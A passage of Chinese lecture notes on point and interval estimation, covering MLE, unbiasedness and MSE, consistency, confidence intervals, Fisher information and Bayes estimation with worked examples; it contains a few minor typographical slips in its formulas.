(<strong>MLE</strong> 的不变性).</p></li><li><p><strong>例</strong>  随机变量 $X_i\sim U(0,\theta)$ 独立同分布, $\theta$ 未知. 求 $\theta$ 的 <strong>MLE</strong>.</p></li><li><p><strong>解答</strong></p><script type="math/tex; mode=display">  L(\theta)=  \begin{cases}  \cfrac{1}{\theta^n}, &X_i\in(0,\theta), \theta\ge\max\{X_1,\cdots,X_n\}\\  0, &其他.  \end{cases}</script><p>  我们得到</p><script type="math/tex; mode=display">  \theta^{*}=\max\{X_1,\cdots,X_n\}.</script></li><li><p><strong>例</strong>  总体 <strong>PDF</strong> 为 $f(x;\theta)=\dfrac{1}{\pi(1+(x-\theta)^2)}$, $x\in\mathbb{R}$ (<strong>Cauchy</strong> 分布).</p></li><li><p><strong>解答</strong></p><ul><li>无矩 $\Rightarrow$ 无矩估计;</li><li>似然方程 $\sum\limits_{i=1}^{n}\dfrac{X_i-\theta}{1+(X_i-\theta)^2}=0$, 不易求解;</li><li>合理估计, $\hat{\theta}$ 为样本中位数.</li></ul></li></ul><h2 id="优良性准则"><a href="#优良性准则" class="headerlink" title="优良性准则"></a>优良性准则</h2><ul><li><p><strong>定义(无偏性)</strong>  定义 $\hat{\theta}=\hat{\theta}(X_1,\cdots,X_n)$ 为 $\theta$ 的估计量 (随机变量). 我们称一个估计 $\hat\theta$ 的偏差 (<strong>Bias</strong>):</p><script type="math/tex; mode=display">E_{\theta}(\hat\theta-\theta)=E_{\theta}(\hat\theta)-\theta.</script><p>若 $E_{\theta}(\hat\theta-\theta)=0$, $\forall\,\theta$, 则称 $\hat\theta$ 为 $\theta$ 的一个无偏估计量.</p></li><li><p><strong>注</strong></p><ul><li>一般地, $E_{\theta}(\hat g(X_1,\cdots,X_n)-g(\theta))=0$, $\forall\,\theta\,\Leftrightarrow$ $\hat{g}$ 为 $g(\theta)$ 的无偏估计;</li><li>无偏 $\Leftrightarrow$ 无系统偏差;</li><li>$\dfrac{1}{N}\sum\limits_{m=1}^{N}\hat{\theta}(X_1^{(m)},\cdots,X_n^{(m)})\stackrel{a.s.}{\longrightarrow}E(\hat\theta)\stackrel{无偏}{=}\theta$;</li><li>无偏性的重要性视情形而定.</li></ul></li><li><p><strong>例</strong>  $E(X)=\mu$, $Var(X)=\sigma^2$.</p></li><li><p><strong>解答</strong></p><ul><li>$E(\overline{X})=\mu\Rightarrow \overline{X}$ 为 $\mu$ 的无偏估计;</li><li>$E(m_2)=E\Big(\dfrac{1}{n}\sum\limits_{i=1}^{n}(X_i-\overline{X})^2\Big)=\dfrac{n-1}{n}\sigma^2$;</li><li>$E(S^2)=E\Big(\dfrac{1}{n-1}\sum\limits_{i=1}^{n}(X_i-\overline{X})^2\Big)=\sigma^2$.</li></ul></li><li><p><strong>例</strong>  $X_i\stackrel{iid}{\sim}U(0,\theta)$.</p></li><li><p><strong>解答</strong></p><ul><li>矩估计 $\hat\theta=2\overline{X}$;</li><li><strong>MLE</strong> $\theta^{*}=\max\{X_1,\cdots, X_n\}$;</li><li>计算可得 $E(\hat\theta)=\theta,\,E(\theta^{*})=\dfrac{n}{n+1}\theta$.</li></ul></li><li><p><strong>注</strong>  <strong>MLE</strong> 可也能是有偏的 (本例中即为系统偏小).</p></li><li><p><strong>定义(均方误差准则)</strong>  定义一个估计 $\hat\theta$ 的均方误差 (<strong>MSE</strong>):</p><script type="math/tex; mode=display">  E_{\theta}\Big[(\hat\theta-\theta)^2\Big]=Var(\hat\theta)+E_{\theta}^2(\hat\theta-\theta).</script><p>  其中 $Var(\hat\theta)$ 代表着精确度, $E_{\theta}^2(\hat\theta-\theta)$ 代表着准确度.</p></li><li><p><strong>定义</strong>  假定 $\hat\theta_1$, $\hat\theta_2$ 均为 $\theta$ 的无偏估计, 若</p><script type="math/tex; mode=display">  \forall\,\theta,\,Var(\hat\theta_1)\le Var(\hat\theta_2)</script><p>  且</p><script type="math/tex; mode=display">  \exists\,\theta_0,\,Var_{\theta_0}(\hat\theta_2)<Var_{\theta_0}(\hat\theta_1).</script><p>  则称在均方误差意义下 $\hat\theta_1$ 优于 $\hat\theta_2$.</p></li><li><p><strong>例</strong>  $E(X)=\mu$.</p></li><li><p><strong>解答</strong>  </p><script type="math/tex; mode=display">  E(\overline{X})=E(X_1)=E\Big(\dfrac{1}{2}X_1+\dfrac{1}{2}X_2\Big)=\mu.</script><script type="math/tex; mode=display">  Var(\overline{X})=\dfrac{1}{n}\sigma^2,\,Var(X_1)=\sigma^2,\,Var\Big(\dfrac{1}{2}X_1+\dfrac{1}{2}X_2\Big)=\dfrac{1}{2}\sigma^2.</script></li><li><p><strong>注</strong>  有时也可称为“有效性准则”.</p></li><li><p><strong>定义</strong>  假定 $\hat\theta_0$ 为 $\theta$ 的无偏估计, 若对任意 $\theta$ 与 $\theta$ 的无偏估计 $\hat\theta$</p><script type="math/tex; mode=display">  Var(\hat\theta_0)\le Var(\hat\theta)</script><p>  则称 $\hat\theta_0$ 为最小方差无偏估计 (<strong>MVUE</strong>).</p></li><li><p><strong>例</strong>  $X\sim N(\mu,\sigma^2)$.</p></li><li><p><strong>解答</strong>  由于</p><script type="math/tex; mode=display">E(m_2)=\dfrac{n-1}{n}\sigma^2,\,E(S^2)=\sigma^2.</script><p>因此计算可得</p><script type="math/tex; mode=display">E\Big[(m_2-\sigma^2)^2\Big]=\cdots<E\Big[(S^2-\sigma^2)^2\Big]=\cdots</script><p>这是用低偏差换了方差.</p></li><li><p><strong>定义</strong></p><ul><li>$\hat\theta=\hat\theta(X_1,\cdots,X_n)$ 的分布称为抽样分布;</li><li>$\hat\theta=\hat\theta(X_1,\cdots,X_n)$ 的标准差称为标准误差, 记为 $se(\hat\theta)$.</li></ul></li><li><p><strong>定义(大样本性质)</strong>  估计量 $\hat\theta$ 当 $n\rightarrow\theta$ 时的性质.</p></li><li><p><strong>定义(渐进无偏性)</strong>  有 $\lim\limits_{n\rightarrow\infty} E(\hat\theta-\theta)=0$;</p></li><li><p><strong>定义(相合性)</strong>  若 $\forall\,\varepsilon&gt;0$, 有 $\lim\limits_{n\rightarrow\infty}P(\left|\hat\theta-\theta\right|\ge\varepsilon)=0$, 则称 $\hat\theta$ 为 $\theta$ 的一个相合估计, 即 $\hat\theta\stackrel{P}{\longrightarrow}\theta$.</p><ul><li><strong>WLLN</strong> $\Rightarrow$ $\overline{X}$ 是 $\mu$ 的一个相合估计;</li><li>相合性是良好点估计的自然要求.</li></ul></li><li><p><strong>例</strong>  我们得到</p><script type="math/tex; mode=display">  \begin{aligned}  m_2&=\dfrac{1}{n}\sum\limits_{i=1}^{n}(X_i-\overline{X})^2\\  &=\dfrac{1}{n}\sum\limits_{i=1}^{n}(X_i-\mu-\overline{X}+\mu)^2\\  &=\dfrac{1}{n}\sum\limits_{i=1}^{n}(X_i-\mu)^2-(\overline{X}-\mu)^2\\  &\stackrel{P}{\rightarrow}E\Big[(X-\mu)^2\Big]\\  &=\sigma^2.  \end{aligned}</script><p>  进而有</p><script type="math/tex; mode=display">  S^2=\dfrac{n}{n-1}m_2\stackrel{P}{\rightarrow}\sigma^2.</script></li><li><p><strong>定义(渐进正态性)</strong>  $\dfrac{\hat\theta-\theta}{se(\hat\theta)}\stackrel{d}{\rightarrow}Z\sim(0,1)$ (渐进正态估计).</p><ul><li><p>$\hat\theta\stackrel{近似}{\sim}N(0,se^2(\hat\theta))$;</p></li><li><p><strong>CLT</strong> $\Rightarrow\overline{X}$ 为 $\mu$ 的一个渐进正态估计, $se(\overline{X})=\dfrac{\sigma}{\sqrt{n}}$.</p></li></ul></li></ul><h2 id="置信区间-Condifence-Interval"><a href="#置信区间-Condifence-Interval" class="headerlink" title="置信区间 (Condifence Interval)"></a>置信区间 (Condifence Interval)</h2><ul><li><p><strong>定义(置信区间)</strong>  $\forall\,\alpha\in(0,1)$, $\forall\,\theta$, 有 $\hat\theta_i=\hat\theta_i(X_1,\cdots,X_n)$, 其中 $i=1,2$, 使得</p><script type="math/tex; mode=display">  P(\hat\theta_1<\theta<\hat\theta_2)\ge 1-\alpha.</script><p>  则称 $(\hat\theta_1,\hat\theta_2)$ 为 $\theta$ 的 $(1-\alpha)$ 置信的区间估计 (双侧).</p></li><li><p><strong>注</strong></p><ul><li>$\alpha$ 通常取为 $0.05$, $0.01$, $0.1$;</li><li>置信 (水平、系数、度) 是针对方法的;</li><li>可靠性优先原则 (先保证 $P(\hat\theta_1&lt;\theta&lt;\hat\theta_2)\ge 1-\alpha$), 再尽量提升精度 (通常用 $E(\hat\theta_2-\hat\theta_1)$ 刻画).</li></ul></li><li><p><strong>例</strong>  $X\sim N(\mu,\sigma^2)$, <strong>已知</strong> $\sigma^2$, 给出 $\mu$ 的 $(1-\alpha)$ 置信区间估计.</p></li><li><p><strong>解答</strong>  注意到</p><script type="math/tex; mode=display">  \begin{aligned}  &\overline{X}-\mu\sim N(0,\dfrac{\sigma^2}{n})\\  \Longleftrightarrow&\dfrac{\overline{X}-\mu}{\frac{\sigma}{\sqrt{n}}}\sim N(0,1)\\  \Longrightarrow&P\Big(\left|\dfrac{\overline{X}-\mu}{\frac{\sigma}{\sqrt{n}}}\right|<Z_{\tfrac{\alpha}{2}}\Big)=1-\alpha.  \end{aligned}</script><p>  其中 $Z_{\tfrac{\alpha}{2}}$ 为 $N(0,1)$ 的上侧 $\dfrac{\alpha}{2}$ 分位数. 因此所求 $(1-\alpha)$ 置信的区间估计为</p><script type="math/tex; mode=display">  (\overline{X}-\frac{\sigma}{\sqrt{n}}Z_{\tfrac{\alpha}{2}},\overline{X}+\frac{\sigma}{\sqrt{n}}Z_{\tfrac{\alpha}{2}}).</script></li><li><p><strong>注</strong></p><ul><li>若 $\alpha=0.05$, 则 $Z_{\tfrac{\alpha}{2}}=Z_{0.025}\approx 1.96\approx 2$;</li><li>若用 $\overline{X}$ 估计 $\mu$, 则有 $(1-\alpha)$ 置信, 误差绝对值 $\vert\overline{X}-\mu\vert\le\frac{\sigma}{\sqrt{n}}Z_{\tfrac{\alpha}{2}}$;</li><li>给定 $\varepsilon&gt;0$, 则 $n\ge\Big(\dfrac{Z_{\frac{\alpha}{2}}\sigma}{\varepsilon}\Big)^2$ 时, 有 $(1-\alpha)$ 置信, 误差绝对值 $\le\varepsilon$.</li></ul></li><li><p><strong>例</strong>  $X\sim N(\mu,\sigma^2)$, <strong>未知</strong> $\sigma^2$, 给出 $\mu$ 的 $(1-\alpha)$ 置信区间估计.</p></li><li><p><strong>解答</strong>  注意到</p><script type="math/tex; mode=display">  \dfrac{\overline{X}-\mu}{\frac{\sigma}{\sqrt{n}}}\sim N(0,1),\\  \dfrac{(n-1)S^2}{\sigma^2}\sim\chi^2(n-1).</script><p>  注意到 $\overline{X}$, $S^2$ 相互独立, 由<strong>陈书 $P_{93-94}$</strong>可得</p><script type="math/tex; mode=display">  \dfrac{\overline{X}-\mu}{\frac{\sigma}{\sqrt{n}}}/\dfrac{S}{\sigma}\sim t(n-1).</script><p>  即</p><script type="math/tex; mode=display">  \dfrac{\overline{X}-\mu}{\frac{S}{\sqrt{n}}}\sim t(n-1).</script><p>  因此</p><script type="math/tex; mode=display">  P\Big(\left|\dfrac{\overline{X}-\mu}{\frac{S}{\sqrt{n}}}\right|<t_{\tfrac{\alpha}{2}}(n-1)\Big)=1-\alpha.</script><p>  其中 $t_{\tfrac{\alpha}{2}}(n-1)$ 为 $t(n-1)$ 分布上侧 $\dfrac{\alpha}{2}$ 分位数, 所求 $(1-\alpha)$ 置信区间估计为</p><script type="math/tex; mode=display">  (\overline{X}-\frac{S}{\sqrt{n}}t_{\tfrac{\alpha}{2}}(n-1),\overline{X}+\frac{S}{\sqrt{n}}t_{\tfrac{\alpha}{2}}(n-1)).</script></li><li><p><strong>注</strong>  $\dfrac{\overline{X}-\mu}{\frac{\sigma}{\sqrt{n}}}$, $\dfrac{\overline{X}-\mu}{\frac{S}{\sqrt{n}}}$ 成为枢轴变量.</p></li><li><p><strong>例</strong>  $X\sim N(\mu,\sigma^2)$, <strong>未知</strong> $\mu$, 给出 $\sigma^2$ 的 $(1-\alpha)$ 置信区间估计.</p></li><li><p><strong>解答</strong>  注意到</p><script type="math/tex; mode=display">  \dfrac{(n-1)S^2}{\sigma^2}\sim\chi^2(n-1).</script><p>  因此所求 $(1-\alpha)$ 置信区间估计为</p><script type="math/tex; mode=display">  \Big(\frac{(n-1)S^2}{\chi^2_{\tfrac{\alpha}{2}}(n-1)},\frac{(n-1)S^2}{\chi^2_{1-\tfrac{\alpha}{2}}(n-1)}\Big).</script></li><li><p><strong>注</strong>  我们有</p><script type="math/tex; mode=display">  \begin{aligned}  \dfrac{(n-1)S^2}{\sigma^2}&=\dfrac{\sum_{i=1}^{n}(X_i-\overline{X})^2}{\sigma^2}\\  &=\sum\limits_{i=1}^{n}\Big(\dfrac{X_i-\mu}{\sigma}\Big)^2-\Big(\dfrac{\overline{X}-\mu}{\tfrac{\sigma}{\sqrt{n}}}\Big)^2\\  &\sim\chi^2(n-1).  \end{aligned}</script></li><li><p><strong>例</strong>  $X\sim N(\mu_1,\sigma^2)$, $Y\sim N(\mu_2,\sigma^2)$ 相互独立, <strong>未知</strong> $\mu_1$, $\mu_2$, $\sigma^2$, 给出 $\mu_1-\mu_2$ 的 $(1-\alpha)$ 置信区间估计.</p></li><li><p><strong>解答</strong>  设 $X_1,\cdots,X_n$, $Y_1,\cdots,Y_m$ 为随机样本, $S_1^2$ 为 $X$ 的样本方差, $S_2^2$ 为 $Y$ 的样本方差, 则</p><script type="math/tex; mode=display">  (\overline{X}-\overline{Y})-(\mu_1-\mu_2)\sim N(0,\dfrac{\sigma^2}{n}+\dfrac{\sigma^2}{m}).</script><p>  因为</p><script type="math/tex; mode=display">  \dfrac{(n-1)S_1^2}{\sigma^2}+\dfrac{(m-1)S_2^2}{\sigma^2}\sim\chi^2(n+m-2).</script><p>  记</p><script type="math/tex; mode=display">  S^2=\dfrac{n-1}{n+m-2}S_1^2+\dfrac{m-1}{n+m-2}S_2^2.</script><p>  从而得到</p><script type="math/tex; mode=display">  \dfrac{(\overline{X}-\overline{Y})-(\mu_1-\mu_2)}{\sqrt{\dfrac{\sigma^2}{n}+\dfrac{\sigma^2}{m}}}/\dfrac{S}{\sigma}\sim t(n+m-2).</script><p>  也即</p><script type="math/tex; mode=display">  \dfrac{(\overline{X}-\overline{Y})-(\mu_1-\mu_2)}{S\sqrt{\dfrac{1}{n}+\dfrac{1}{m}}}\sim t(n+m-2).</script><p>  这是我们用到的枢轴变量, 所求 $(1-\alpha)$ 置信区间估计为</p><script type="math/tex; mode=display">  \Big(\overline{X}-\overline{Y}-t_{\tfrac{\alpha}{2}}(l)S\sqrt{\dfrac{m+n}{mn}},\overline{X}-\overline{Y}+t_{\tfrac{\alpha}{2}}(l)S\sqrt{\dfrac{m+n}{mn}}\Big).</script><p>  其中 $l=n+m-2$.</p></li><li><p><strong>定义(渐进置信区间)</strong>  通过大样本方法进行区间估计.</p></li><li><p><strong>例(选举问题)</strong>  真实支持率 $p$ 未知, $n=1200$, 观测比例 $\dfrac{684}{1200}\approx 0.57$. 给出 $p$ 的一个 $95\%$ 置信的区间估计.</p></li><li><p><strong>解答</strong>  $X_i\sim B(p)\,(1\le i\le n)$ <strong>iid</strong> (近似有放回, $n&lt;&lt;N$). 我们有</p><script type="math/tex; mode=display">  P_n=P_n(X_1,\cdots,X_n)=\dfrac{1}{n}\sum\limits_{i=1}^{n}X_i=\overline{X}.</script><p>  因此</p><script type="math/tex; mode=display">  E(P_n)=p,\,Var(P_n)=\dfrac{p(1-p)}{n}.</script><p>  由 <strong>CLT</strong>, 得到</p><script type="math/tex; mode=display">  \dfrac{P_n-p}{\sqrt{\tfrac{p(1-p)}{n}}}\sim N(0,1)\Rightarrow P\Big(|\dfrac{P_n-p}{\sqrt{\tfrac{p(1-p)}{n}}}|<Z_{\tfrac{\alpha}{2}}\Big)\approx 1-\alpha.</script><p>  $[1]$ 用 $S^2=\dfrac{1}{n-1}\sum\limits_{i=1}^{n}(X_i-\overline{X})^2$ 来估计 $\sigma^2=p(1-p)$. 由 <strong>CLT</strong>, 得到</p><script type="math/tex; mode=display">  \dfrac{P_n-p}{\sqrt{\tfrac{S^2}{n}}}\stackrel{近似} {\sim} N(0,1)\Rightarrow P\Big(|\dfrac{P_n-p}{\sqrt{\tfrac{S^2}{n}}}|<Z_{\tfrac{\alpha}{2}}\Big)\approx 1-\alpha.</script><p>  其中 $S^2\approx 0.2475$, 区间估计为 $(0.542,0.598)$.</p><p>  $[2]$ 用 $m_2=\dfrac{1}{n}\sum\limits_{i=1}^{n}(X_i-\overline{X})^2$ 来估计 $\sigma^2=p(1-p)$. </p><p>  实际上, 我们有</p><script type="math/tex; mode=display">  m_2=\dfrac{1}{n}[(1-P_n)^2nP_n+(0-P_n)^2(n-nP_n)]=P_n(1-P_n).</script><p>  由 <strong>CLT</strong>, 得到</p><script type="math/tex; mode=display">  \dfrac{P_n-p}{\sqrt{\tfrac{P_n(1-P_n)}{n}}}\stackrel{近似} {\sim} N(0,1)\Rightarrow p\in(0.542,0.598).</script><p>  $[3]$ 用 $p(1-p)$ 的最大值来估计 $\sigma^2=p(1-p)$. 由 <strong>CLT</strong>, 得到</p><script type="math/tex; mode=display">  \dfrac{P_n-p}{\sqrt{\tfrac{1}{4n}}}\stackrel{近似} {\sim} N(0,1)\Rightarrow p\in(0.542,0.599).</script></li><li><p><strong>注</strong>  近似分布情况下, 置信度 $\approx 1-\alpha$, 近似程度取决于 $n$ 及总体分布.</p></li><li><p><strong>定义(利用 MLE 构建置信区间)</strong></p><p>  总体分布 $f$ 满足一定的光滑性条件, 存在 $\sigma_n&gt;0$, 使 $\dfrac{\theta^{*}-\theta}{\sigma_n}\rightarrow N(0,1)$.</p></li><li><p><strong>定义(Fisher 信息量)</strong>  $X_1,\cdots,X_n$ <strong>iid</strong>, 其 <strong>PDF</strong> 为 $f(x;\theta)$. 定义对数似然函数</p><script type="math/tex; mode=display">  l(\theta)=\log L(\theta)=\sum_{i=1}^{n}\log f(x_i;\theta).</script><p>  定义</p><script type="math/tex; mode=display">  I_n(\theta)=E\Big[\big(\dfrac{\partial l(\theta)}{\partial\theta}\big)^2\Big]=E\Big[\big(\sum_{i=1}^{n}\dfrac{\partial\log f(X_i;\theta)}{\partial\theta}\big)^2\Big].</script><p>  注意到</p><script type="math/tex; mode=display">  \begin{aligned}  E\Big(\dfrac{\partial\log f(X_i;\theta)}{\partial\theta}\Big)&=E\Big(\dfrac{f_{\theta}(X_i;\theta)}{f(X_i;\theta)}\Big)\\  &=\int\dfrac{f_{\theta}(X_i;\theta)}{f(X_i;\theta)}f(X_i;\theta)dx\\  &=\int f_{\theta}(X_i;\theta)dx\\  &=\dfrac{d}{d\theta}\int f(X_i;\theta)dx=0.  \end{aligned}</script><p>  因此</p><script type="math/tex; mode=display">  \begin{aligned}  \end{aligned}\begin{aligned}  I_n(\theta)&=E\Big[\big(\sum_{i=1}^{n}\dfrac{\partial\log f(X_i;\theta)}{\partial\theta}\big)^2\Big]\\  &=\sum_{i=1}^{n}E\Big[\big(\dfrac{\partial\log f(X_i;\theta)}{\partial\theta}\big)^2\Big]\\  &:=nI(\theta).  \end{aligned}</script><p>  由极大似然估计的定义, 我们有</p><script type="math/tex; mode=display">  0=l'(\theta^*)\approx l'(\theta)+(\theta^*-\theta)l''(\theta)\Rightarrow\theta^*-\theta\approx \dfrac{l'(\theta)}{-l''(\theta)}\\  \Rightarrow\sqrt{n}(\theta^*-\theta)\approx \dfrac{\tfrac{1}{\sqrt{n}}l'(\theta)}{-\tfrac{1}{n}l''(\theta)}.</script><p>  研究上式<strong>分子</strong>: 设随机变量 $Y_i=\dfrac{\partial\log f(X_i;\theta)}{\partial\theta}=\dfrac{f_{\theta}(X_i;\theta)}{f(X_i;\theta)}$, 那么</p><script type="math/tex; mode=display">  E(Y_i)=0,\,Var(Y_i)=E(Y_i^2)-E^2(Y_i)=I(\theta).</script><p>  从而</p><script type="math/tex; mode=display">  \dfrac{1}{\sqrt{n}}l'(\theta)=\dfrac{1}{\sqrt{n}}\sum_{i=1}^{n}Y_i=\dfrac{\overline{Y}}{\tfrac{1}{\sqrt{n}}}\stackrel{CLT}{\longrightarrow}N(0,I(\theta)).</script><p>  研究上式<strong>分母</strong>: </p><script type="math/tex; mode=display">  -\dfrac{1}{n}l''(\theta)=-\dfrac{1}{n}\sum_{i=1}^{n}\Big[\dfrac{f_{\theta\theta}(X_i;\theta)}{f(X_i;\theta)}-\big(\dfrac{f_{\theta}(X_i;\theta)}{f(X_i;\theta)}\big)^2\Big].</script><p>  注意到</p><script type="math/tex; mode=display">  E\Big(\dfrac{f_{\theta\theta}(X_i;\theta)}{f(X_i;\theta)}\Big)=0.</script><p>  因此</p><script type="math/tex; mode=display">  -\dfrac{1}{n}l''(\theta)\stackrel{WLLN}{\longrightarrow}E\Big[\dfrac{1}{n}\sum_{i=1}^{n}\big(\dfrac{f_{\theta}(X_i;\theta)}{f(X_i;\theta)}\big)^2\Big]=\dfrac{1}{n}\sum_{i=1}^{n}E(Y_i^2)=I(\theta).</script><p>  结合上述讨论可得</p><script type="math/tex; mode=display">  \sqrt{n}(\theta^*-\theta)\rightarrow N(0,\dfrac{1}{I(\theta)})\\  \Leftrightarrow\dfrac{\theta^*-\theta}{\tfrac{1}{\sqrt{nI(\theta)}}}\stackrel{近似}{\sim}N(0,1)\\  \Rightarrow\dfrac{\theta^*-\theta}{\tfrac{1}{\sqrt{nI(\theta^*)}}}\stackrel{近似}{\sim}N(0,1).</script><p>  这说明可以取 $\sigma_n=\dfrac{1}{\sqrt{nI(\theta)}}$ 或 $\dfrac{1}{\sqrt{nI(\theta^*)}}$.</p></li><li><p><strong>例(选举问题)</strong>  真实支持率 $p$ 未知, $n=1200$, 观测比例 $\dfrac{684}{1200}\approx 0.57$. 给出 $p$ 的一个 $95\%$ 置信的区间估计.</p></li><li><p><strong>解答续</strong>  注意到 $X_i\stackrel{iid}{\sim}B(p)$, $p$ 的 <strong>MLE</strong> 为 $p^{*}=P_n$. 有似然函数</p><script type="math/tex; mode=display">  f(X;p)=p^{X}(1-p)^{1-X}\Rightarrow \dfrac{\partial\log f}{\partial p}=\dfrac{X-p}{p(1-p)}.</script><p>  <strong>Fisher</strong> 信息量为:</p><script type="math/tex; mode=display">  I(p)=E\Big[\big(\dfrac{X-p}{p(1-p)}\big)^2\Big]=\dfrac{1}{p(1-p)}.</script><p>  得到 $\sigma_n=\dfrac{1}{\sqrt{p(1-p)}}$ 或 $\dfrac{1}{\sqrt{p^{<em>}(1-p^{</em>})}}$. 这与前例 $[2]$ 完全一致.</p></li><li><p><strong>例(两总体)</strong>  $X\sim N(\mu_1,\sigma_1^2)$, $Y\sim N(\mu_2,\sigma_2^2)$ 独立, 参数未知. 估计 $\mu_1-\mu_2$.</p></li><li><p><strong>解答</strong>  得到</p><script type="math/tex; mode=display">  \dfrac{(\overline{X}-\overline{Y})-(\mu_1-\mu_2)}{\sqrt{\dfrac{\sigma_1^2}{n}+\dfrac{\sigma_2^2}{m}}}\sim N(0,1).</script><p>  因此</p><script type="math/tex; mode=display">  \dfrac{(\overline{X}-\overline{Y})-(\mu_1-\mu_2)}{\sqrt{\dfrac{S_1^2}{n}+\dfrac{S_2^2}{m}}}\stackrel{近似}{\sim} N(0,1).</script></li></ul><h2 id="Bayes-估计"><a href="#Bayes-估计" class="headerlink" title="Bayes 估计"></a>Bayes 估计</h2><ul><li><p><strong>定义(Bayes 估计)</strong></p><ul><li><p>在搜集数据之前, 对参数 $\theta$ 有先验知识, 可用一个概率分布来刻画 (先验分布).</p></li><li><p>$\Theta$ — 随机变量, $\theta$ —  $\Theta$ 的实现值.</p></li><li><p>$X$ — 试验观测, $x$ — 具体观测结果.</p></li><li><p>$f_{\Theta}(\theta)$ — 先验分布, $f_{X\mid\Theta}(x\mid\theta)=f_X(x,\theta)$ — 搜集的样本分布.</p></li><li><p>更新先验分布为后验分布:</p><script type="math/tex; mode=display">  f_{\Theta\mid X}(\theta\mid x)=\dfrac{f(x,\theta)}{f_X(x)}=\dfrac{f_{X\mid\Theta}(x\mid\theta)f_{\Theta}(\theta)}{f_X(x)}.</script><p>  其中</p><script type="math/tex; mode=display">  f_X(x)=\int_{\mathbb{R}}f(x,\theta)d\theta.</script><p>  可通过后验期望或后验众数得到 <strong>Bayes</strong> 估计值.</p></li></ul></li><li><p><strong>例</strong>  投掷硬币, 正面向上的概率为 $\theta$ (未知). 抛 $n$ 次观测到 $x$ 次正面向上.</p></li><li><p><strong>解答</strong>  对 $\theta$ 的先验认知: $\theta\sim U(0,1)$ (<strong>Bayes</strong> 法则). 此时有 $f_{\Theta}(\theta)=1$, $\theta\in(0,1)$.</p><p>  令 $X=n$ 次试验正面向上的次数, 给定 $\theta$ 时, $X\sim B(n,\theta)$. 即</p><script type="math/tex; mode=display">  f_{X\mid\Theta}(x\mid\theta)=P(X=x\mid \Theta=\theta)=C_n^x\theta^x(1-\theta)^{n-x},x=0,1,\cdots, n.</script><p>  故 $(X,\Theta)$ 的联合分布为 </p><script type="math/tex; mode=display">  f(x,\theta)=C_n^x\theta^x(1-\theta)^{n-x},\theta\in(0,1),x=0,1,\cdots, n.</script><p>  得到</p><script type="math/tex; mode=display">  f_X(x)=\int_0^1f(x,\theta)d\theta=C_n^x\int_0^1\theta^x(1-\theta)^{n-x}d\theta\\  =\dfrac{n!}{x!(n-x)!}\cdot\dfrac{\Gamma(x+1)\Gamma(n-x+1)}{\Gamma(n+2)}=\dfrac{1}{n+1}</script><p>  进而</p><script type="math/tex; mode=display">  f_{\Theta\mid X}(\theta\mid x)=\dfrac{f(x,\theta)}{f_X(x)}=\dfrac{\Gamma(n+2)}{\Gamma(x+1)\Gamma(n-x+1)}\cdot\theta^x(1-\theta)^{n-x}.</script><p>  注意到这恰好为 $\beta(x+1,n-x+1)$ 的 <strong>PDF</strong>.</p><p>  <strong>后验均值</strong>估计值为</p><script type="math/tex; mode=display">  \hat\theta=E(\Theta\mid X)=\int_0^1\theta f_{\Theta\mid X}(\theta\mid x)d\theta=\dfrac{x+1}{n+2}.</script><p>  <strong>后验众数</strong>估计值为 $f_{\Theta\mid X}(\theta\mid x)$ 的最大值点</p><script type="math/tex; mode=display">  \theta^{*}=\dfrac{x}{n}.</script></li><li><p><strong>注</strong>  </p><ul><li>若 $n=20$, $x=13$, 后验分布服从 $\beta(14,8)$.</li><li>此时 $P(\Theta&gt;\dfrac{1}{2})\approx 0.91$, 而 $\Theta&lt;\dfrac{1}{4}$ 基本不可能.</li></ul></li><li><p><strong>注(合理的点估计)</strong></p><ul><li>后验众数;</li><li>后验均值.</li></ul></li><li><p><strong>注(先验分布选取)</strong> </p><ul><li>本问题先验分布服从 $U(0,1)=\beta(1,1)$, 后验分布服从 $\beta(x+1,n-x+1)$;</li><li>一般地, 先验分布服从 $\beta(a,b)$, 后验分布服从 $\beta(a+x,b+n-x)$.</li></ul></li><li><p><strong>定义(Bayes 区间估计)</strong>  得到参数 $\theta$ 的后验分布 $f_{\Theta}(\theta\mid x)$, 给定观测值 $x$ 和实数 $\alpha\in(0,1)$, 若对参数 $\theta$ 的任意可能取值, 都成立</p><script type="math/tex; mode=display">  P(a<\Theta<b\mid x)\ge 1-\alpha.</script><p>  则称 $(a,b)$ 为 $\theta$ 的 $(1−\alpha)$ 置信的 <strong>Bayes</strong> 区间估计.</p></li><li><p><strong>注</strong></p><ul><li>最大后验区间 (一般单峰);</li><li>等尾可信区间.</li></ul></li><li><p><strong>例</strong>  $X\sim N(\mu,\sigma^2)$, $\sigma^2$ 已知, 给出 $\mu$ 的 $(1-\alpha)$ 置信的 <strong>Bayes</strong> 区间估计.</p></li><li><p><strong>解答</strong>  取 $\mu$ 的先验分布 $f(\mu)\propto 1$, 有后验分布为 $N(\overline{X},\dfrac{\sigma^2}{n})$.</p><p>  进一步可得</p><script type="math/tex; mode=display">  \dfrac{\mu-\overline{X}}{\tfrac{\sigma}{\sqrt{n}}}\sim N(0,1).</script><p>  得到所求 <strong>Bayes</strong> 估计区间为</p><script type="math/tex; mode=display">  (\overline{X}-\frac{\sigma}{\sqrt{n}}Z_{\tfrac{\alpha}{2}},\overline{X}+\frac{\sigma}{\sqrt{n}}Z_{\tfrac{\alpha}{2}}).</script></li></ul><h2 id="Review"><a href="#Review" class="headerlink" title="Review"></a>Review</h2><h3 id="样本"><a href="#样本" class="headerlink" title="样本"></a>样本</h3><ul><li>$X_1,\cdots,X_n$ 为样本, 通常为 <strong>iid</strong>.</li><li>$\hat\theta=\hat\theta(X_1,\cdots,X_n)$ 为统计量.</li><li>样本分布: $f(x_1,\cdots,x_n;\theta)$ (<strong>PDF</strong>\*<em>PMF*</em>).</li><li>抽样分布: $\hat\theta$ 的分布.</li><li>标准误差: $se=se(\hat\theta)=\sqrt{Var(\hat\theta)}$.</li></ul><h3 id="经典估计的优良性"><a href="#经典估计的优良性" class="headerlink" title="经典估计的优良性"></a>经典估计的优良性</h3><ul><li>$n$ 固定: 无偏性 &amp; 有效性 (<strong>MSE</strong> 的分解)</li><li>$n\rightarrow\infty$: 渐近无偏 &amp; 相合性 (<strong>WLLN</strong> 一致性) &amp; 渐近正态性 (<strong>CLT</strong>)</li></ul><h3 id="置信区间"><a href="#置信区间" class="headerlink" title="置信区间"></a>置信区间</h3><ul><li>$\hat\theta_i=\hat\theta_i(X_1,\cdots,X_n)\,(i=1,2)$.</li><li>$P(\hat\theta_1&lt;\theta&lt;\hat\theta_2)\ge 1-\alpha$.</li><li>置信 (水平、系数、度) 是针对方法.</li><li>枢轴变量: $H(\hat\theta,\theta)$ 表示分布可用.</li></ul><h3 